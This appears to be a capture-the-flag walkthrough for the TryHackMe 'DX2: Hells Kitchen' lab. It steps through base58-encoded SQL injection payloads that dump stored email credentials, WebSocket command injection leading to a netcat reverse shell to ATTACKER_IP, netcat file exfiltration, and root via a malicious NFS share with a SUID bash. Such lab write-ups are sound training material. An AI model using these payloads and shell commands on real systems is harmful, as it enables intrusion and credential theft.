# DX2: Hells Kitchen
---
[TryHackMe](https://tryhackme.com/room/dx2hellskitchen)
>|hard|linux|web|
---
>We need to recover the lost Ambrosia shipment from the NSF (National Secessionist Forces), the only treatment for the plague known as the Grey Death. However, we haven't located their main base of operations.
>
>What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.
>
>Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.
## nmap & endpoints
Using `nmap -sV -sC -T4 -p- $IP -oN dx2.nmap`, we discovered two open ports: 80, 4346.
Firstly, we check the web. Inspecting the source using developer tools, we have discovered an endpoint for bookings `/static/new-booking.js`. Inspecting the traffic with Burp suite, we noticed that the *rooms-available* check is based on API call `/api/rooms-available`, if it returns number smaller than 6, it redirects to `/new-booking`.
Let us explore further with curl:
The script requires a cookie, taking a valid one from browser we try the following request:
`curl -s $IP/static/new-booking.js -b $COOKIE`, this returns a different, base58 encoded cookie.
Containing `booking_id:<booking_number>`
![new-booking](./img/rooms_available_api.png)
![b58 cookie](./img/b58_cookie_id.png)

## Messing around with the cookie:
We have tried testing for IDOR, but there were too many possibilities and the requests took about a second or two which would be too slow.
Next, we tested if the cookie is SQL injectable. sending base58 encoded `booking_id:1'` suggests so. Hence, we explored further. 
Next, we list the payloads we tried as the cookie, firstly, we tried enumerating the number of columns starting with one, there were two columns:
4JM2kc4MgR8vm5J3DCq1EqxbMwQeB4tq17KfLapTgrcGuFSdEJ3 = `booking_id:1' UNION SELECT 1,2 -- - `
Further, we only list plaintext payloads we have tried, those need to be firstly encoded to base58 before use.
- enumerating DB version & type:
  - `booking_id:1' UNION SELECT Version(), @@version -- - `
  - `booking_id:1' UNION SELECT 1, sqlite_version() -- - ` This payload was a success returning version 3.42.0 and the sqlite DB.
- sqlite schema:
  - `booking_id:1' UNION SELECT 1, sql FROM sqlite_master -- - `
- table enumeration:
`booking_id:1' UNION SELECT 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE '%sqlite%' -- - ` This payload returned the following {"room_num":"1","days":"email_access,reservations,bookings_temp"}                                
- enumerating tables:
    - Reservations: `booking_id:1' UNION SELECT 1, sql FROM sqlite_master WHERE name='reservations' -- - ` columns are *guest_name, room_num, days_remaining*
    - email_access: `booking_id:1' UNION SELECT 1, sql FROM sqlite_master WHERE name='email_access' -- - ` This table seems much more interesting as it contains *guest_name, email_username, email_password*, which could provide further access.
    - bookings_temp: `booking_id:1' UNION SELECT 1, sql FROM sqlite_master WHERE name='bookings_temp' -- - ` We have checked this just for the sake of completeness but it was not interesting, contained only the columns *booking_id, room_num, days*

Let us further explore the email_access for username and password.
Using the following payload
`payload=$(echo "booking_id:1' UNION SELECT group_concat(email_username), group_concat(email_password) FROM email_access -- -" | base58)`
<!-- === DU2Kyd7461FVD3JNJXW3WkGFfcr6rihcb46H3uRcd6cNjJmcsfe3Vf95UtHEy6RwQ4yXekQNpjkbZqpGKhRUwyABYWQk3Q2BtCxHxRnitAankfsonCZDiWaSKcvbynEJKdkTYRceFoCq5VkP8wYZd -->
we send the request:
```bash
 curl $IP/api/booking-info?booking_key=$payload
{"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,pdenton,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,<*REDACTED*>,,"}
```
Obtaining username and corresponding password! <!-- pdenton:<*REDACTED*> -->

## gobuster & NYC
Now, we explore the other port. Firstly using `gobuster dir -u $IP:4346 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt` discovered *mail* and *WS* endpoints.
With the credentials we recovered using the SQLi, we log in to the */mail* endpoint.

## Reverse shell
### Gilbert
From the mail endpoint, upon source inspection using developer tools, we notice that the script establishes a Websocket connection: `ws://${location.host}/ws` updating time on the page.
Through the devtools console we can interact with the WebSocket pointing to command injection.
After a bit of fiddling around, we find out how to send commands using
`socket.send("${cmd}")`, though the output is limited to only a couple characters the output also gets quickly overwritten by the updated time.
Some commands returned invalid, which was not due to command filtering but because command length was limited. Finally, we arrived at a solution: create an exectuable locally, host it on our server and download it remotely using the WebSocket.
We create the payload:
`busybox nc -e /bin/sh ATTACKER_IP PORT`I
and host it on our server: `python3 -m http.server 80`
using port 80 as it is used by the server and some other ports refused to connect and
setting up a listener `nc -nvlp 443`, where we followed the same process of trial and error.
Finally the injection worked.
Now we spawn shell using `SHELL=/bin/bash script -q /dev/null` to obtain a better shell.
We have spawned as gilbert which we found out using `id`.
Searching `$HOME` reveals note with something that appears as a password for account *sandra:<REDACTED>*
Using `sudo -l` reveals we can use ufw status and we can see that the only open ports for outgoing traffic are 80 and 443.
![gilbert priv esc](./img/gilbert_priv_esc+pwd.png)
There is a note from sandra as well which we found using `find / -type f -user sandra 2>/dev/null`
Her note was stored in */srv/.dad*, we read it and noticed it contains sandra's password.
### Sandra
Switching to Sandra's account `su sandra`.
Executing `sudo -l` reveals that Sandra can start/stop the tonhotel service, which will be usefull later.
Next we saw a user flag located in her home directory.
![user flag](./img/sandra_shell_user_flag_redacted.png)
We have also discovered a picture named *boss.jpg*, using netcat, we download picture from Sandra:
Remotely:`nc -vw3 <attacker_ip> <port> < /home/sandra/Pictures/boss.jpg`
locally:
`nc -vlp <port> > boss.jpg`
the picture contains the password to JoJo's account.
![boss.jpg](./img/boss_redacted.png)
### JoJo
Switching to JoJo using the recovered password and executing, `sudo -l` reveals we can use `/usr/sbin/mount.nfs` as root and we also find a note about NFS. So we set up a malicious nfs share locally and share it to JoJo:
```bash
sudo -i 
apt update
apt install nfs-kernel-server
mkdir -p /srv/nfs/shared
chown nobody:nogroup /srv/nfs/shared # security reasons to minimise permissions
chmod 755 /srv/nfs/shared
# next we add it to /etc/exports
echo '/srv/nfs/shared *(rw,sync,no_subtree_check)' >> /etc/exports
exportfs -ra # re-export the shares in `/etc/exports`.
# start the server 
systemctl enable nfs-server
systemctl start nfs-server
# open it on port 80, which is allowed on the server
vim /etc/nfs.conf # uncomment line `port` in [nfsd], change the value to 80
systemctl restart nfs-server
systemctl restart rpcbind
# check the share is up & running:
rpcinfo -p # shoud see the nfs server running on port 80
```

On the target machie:
`su sandra`
and disable the web so that port 80 is free to connect to our nfs share:
`sudo /usr/bin/systemctl stop tonhotel`
and switch back to JoJo:
`su jojo`
create a share directory in `$HOME` and mount our share:
`mkdir share; sudo /usr/sbin/mount.nfs -o port=80 <attacker_ip>:/ /home/jojo/share -wv`
Now that we are connected to our share we need to transfer & modify the bash so JoJo can run as root. Firstly, we transfer the shell.
Locally:
`nc -vlp 443 > shell`
(listen on the opened connection for a file)
Target:
`nc -vw3 <attacker_ip> <port> < /bin/bash`
This sends the shell to our machine, where we modify it so jojo can run it properly:
Locally (set SUID and executability bits so JoJo can execute it as root):
`chmod +sx shell; mv shell /srv/nfs/shared`
Then as JoJo we can run:
`./shared/shell -p`
which provides us with the root shell. Lastly, we read the root flag:
`cat /root/root.txt`
![root flag](./img/root_flag_redacted.png)
